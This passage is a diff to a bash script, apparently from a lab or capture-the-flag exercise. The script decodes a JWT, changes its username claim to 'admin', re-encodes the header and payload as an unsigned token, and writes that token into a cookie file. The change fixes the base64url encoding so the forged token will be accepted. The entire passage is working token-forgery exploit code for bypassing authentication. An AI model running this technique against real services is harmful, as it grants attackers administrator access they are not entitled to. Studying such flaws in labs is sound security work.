@@ -44,8 +44,8 @@ echo "--> Decoded token payload : $PAYLOAD"
 
 MODIFIED_PAYLOAD=$(echo "$PAYLOAD" | jq '.username = "admin"' | tr -d '\n' | tr -d ' ')
 echo "--> Modified token payload : $MODIFIED_PAYLOAD"
-ENCODED_HEADER=$(echo "$HEADER" | base64)
-ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD" | base64)
+ENCODED_HEADER=$(echo "$HEADER" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
+ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD"
 echo "--> Token modified : $UNSIGNED_TOKEN"
 sed -i "s/\(jwt-token\s*\)\S\+/\1$UNSIGNED_TOKEN/" "/work/8-cookies.txt"
